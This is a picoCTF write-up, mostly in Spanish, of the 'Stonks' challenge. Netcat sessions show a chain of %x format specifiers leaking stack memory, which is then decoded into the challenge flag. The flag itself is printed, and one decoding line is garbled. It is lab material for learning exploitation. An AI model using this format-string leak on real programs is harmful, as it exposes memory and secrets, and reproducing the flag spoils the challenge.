## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`
## Solución
```
┌──(kali㉿kali)-[~/picoCTF/BinExp/Stonks]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x
Buying stonks with token:
9f06410
Portfolio as of Wed Nov 13 05:59:23 UTC 2024


1 shares of BYLZ
1 shares of GH
16 shares of Z
24 shares of BHDS
12 shares of MO
104 shares of LBOW
1057 shares of DYNZ
780 shares of Z
23 shares of H
Goodbye!
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/Stonks]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x 
Buying stonks with token:
977d390804b00080489c3f7ed0d80ffffffff1977b160f7ede110f7ed0dc70977c1803977d370977d3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffa4007df7f0baf8f7ede44077dabe0010f7d6dce9f7edf0c0f7ed05c0f7ed0000ffa406c8f7d5e68df7ed05c08048ecaffa406d40f7ef2f09804b000f7ed0000f7ed0e20ffa40708f7ef8d50f7ed189077dabe00f7ed0000
Portfolio as of Wed Nov 13 06:00:46 UTC 2024


3 shares of NPR
36 shares of GXK
4 shares of MN
184 shares of W
758 shares of PKE
Goodbye!
```

- ##### Al poner varios "x%", nos dan una cadena en formato hexadecimal, el cual desencriptaremos en CyberChef.
```
Token: 977d390804b00080489c3f7ed0d80ffffffff1977b160f7ede110f7ed0dc70977c1803977d370977d3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffa4007df7f0baf8f7ede44077dabe0010f7d6dce9f7edf0c0f7ed05c0f7ed0000ffa406c8f7d5e68df7ed05c08048ecaffa406d40f7ef2f09804b000f7ed0000f7ed0e20ffa40708f7ef8d50f7ed189077dabe00f7ed0000

Token Desencriptado: 9}
```

- ##### Al desencriptarlo y borrar algunos caracteres, obtenemos la bandera.
```
Flag: picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)
- [CyberChef](https://gchq.github.io/CyberChef/)